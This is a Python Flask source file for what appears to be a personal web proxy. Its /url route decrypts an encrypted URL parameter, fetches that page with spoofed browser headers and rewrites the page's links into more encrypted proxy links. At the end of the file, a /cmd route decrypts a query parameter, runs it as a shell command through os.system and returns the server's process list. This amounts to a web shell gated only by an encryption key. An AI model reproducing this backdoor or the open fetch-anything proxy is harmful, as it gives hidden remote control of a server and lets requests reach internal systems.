import time

import requests as requests
from flask import Flask, request
from aes import decrypt, encrypt
import bs4
import os

app = Flask(__name__)
app.config['JSON_AS_ASCII'] = False


@app.route('/')
def hello_world():
    return 'URL'


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://www.sdyu.edu.cn/index.htm",
}


# @app.before_request
# def proxy():
#     headers = {h[0]: h[1] for h in request.headers}
#     print('request.json',request.json)
#     # headers['x-token'] = '***'
#     # 一些自己的逻辑...
#     return requests.request(request.method, request.url, data=request.json, headers=headers).content

def content_decode(string):
    try:
        return string.decode(encoding='utf8')
    except:
        pass
    try:
        return string.decode(encoding='latin1')
    except:
        pass
    try:
        return string.decode(encoding='gbk')
    except:
        pass
    return string


@app.route('/url')
def url():
    if True:
        # try:
        url = request.args.get("url").replace(' ', '+')
        # print("before", url)
        url = decrypt(url)
        # print("after", url)
        if url.startswith("https://"):
            url = url.replace("https://", "http://")
        if not url.startswith("http://"):
            url = f'http://{url}'
        # print("finally", url)
        res = requests.get(url=url, headers=headers)
        # print(res.content)
        # print(res.content.decode('utf8',"ignore"))
        # print(res.content.decode(errors="ignore").encode(encoding='utf-8',errors="ignore"))
        html = content_decode(res.content).encode(encoding='utf-8', errors="ignore")
        # res.encoding = 'UTF-8'
        # html = res.text

        # with open(f"html/{url}.html", 'w') as f:
        #     f.write(html)
        # try:
        soup = bs4.BeautifulSoup(html, "html.parser")
        href_set = {item.get('href') for item in soup.find_all(href=True)}
        replace_dict = {}
        # print(href_set)
        SS = '/url?url='
        if not url.endswith('/'):
            url += '/'

        for item in href_set:
            try:
                if item.startswith('https://'):
                    replace_dict[item] = f'{SS}{encrypt(item)}'
                elif item.startswith('http://'):
                    replace_dict[item] = f'{SS}{encrypt(item)}'
                elif item.startswith('//'):
                    replace_dict[item] = f'{SS}{encrypt(f"http:{item}")}'
                elif item.startswith('/'):
                    replace_dict[item] = f'{SS}{encrypt(f"http://{url}{item}")}'
            except:
                pass

        keys = list(replace_dict.keys())
        keys.sort(key=lambda i: len(i), reverse=True)
        heads = {'href="'}
        for key in keys:
            if len(key) <= 2:
                break
            print("=======", key, replace_dict[key])
            for head in heads:
                # html = html.replace(head + key, head + replace_dict[key])
                html = html.replace((head + key).encode(errors="ignore"),
                                    (head + replace_dict[key]).encode(errors="ignore"))
    # except Exception as e:
    #     print("ERROR", e)
    #     html = "ERROR " + str(e).replace('\n', '<br>')
    return html


@app.route('/cmd')
def cmd():
    cmd = decrypt(request.args.get("cmd").replace(' ', '+'))
    os.system(cmd)
    os.system("ps -ef > cmd.log")
    with open("cmd.log", 'r') as f:
        ret = '<br>'.join(f.readlines())
    return ret


if __name__ == "__main__":
    app.run()
